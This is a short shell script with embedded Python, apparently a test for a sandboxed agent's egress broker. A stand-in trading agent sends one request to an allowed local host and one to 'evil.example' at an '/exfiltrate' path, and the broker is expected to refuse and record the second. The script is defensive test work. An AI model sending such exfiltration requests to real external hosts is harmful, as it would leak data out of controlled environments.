#!/bin/sh
# A stand-in trading agent running INSIDE the sealed cell. It has NO raw network (empty netns);
# its only way out is the mediated broker socket bind-mounted at /work/.bulla/egress.sock. It asks
# for an allowed host (the "exchange API") and a disallowed one; the broker performs the first and
# refuses the second, hashing both into the receipt.
python3 - <<'PY'
import socket
def call(req):
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM); s.settimeout(3)
    try:
        s.connect("/work/.bulla/egress.sock")
    except Exception as e:
        print("no egress channel:", e); return b""
    s.sendall((req + "\n").encode())
    data = b""
    while True:
        b = s.recv(4096)
        if not b: break
        data += b
    return data
print("ALLOWED  ->", call("127.0.0.1 8799 /quote")[:80])
print("DENIED   ->", call("evil.example 443 /exfiltrate")[:80])
PY
